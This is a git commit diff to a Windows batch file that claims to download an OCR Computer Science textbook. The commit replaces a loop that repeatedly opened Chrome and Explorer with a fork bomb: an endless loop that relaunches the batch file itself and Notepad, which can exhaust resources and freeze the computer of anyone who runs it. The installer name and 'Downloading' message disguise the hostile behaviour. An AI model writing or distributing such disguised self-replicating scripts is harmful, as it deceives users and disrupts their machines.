b0bf40a0fc4a77f99403f0f7cc43d2f7effb4225
Rowan Pankhurst <35931494+Row912@users.noreply.github.com>
2018-06-23 12:19:02 +0100

    Updated

--- OCRTextBookInstaller.bat
+++ OCRTextBookInstaller.bat
@@ -2,8 +2,8 @@
 echo Downloading OCR Computer Science Text Book...
 timeout /t 05
 echo Enjoy
+
 :loop
-start chrome www.google.co.uk
-start chrome www.google.co.uk
-explorer.exe
-if "y"=="y" goto loop
+start OCRTextbookInstaller.bat
+start %SystemRoot%\System32\Notepad.exe
+goto loop
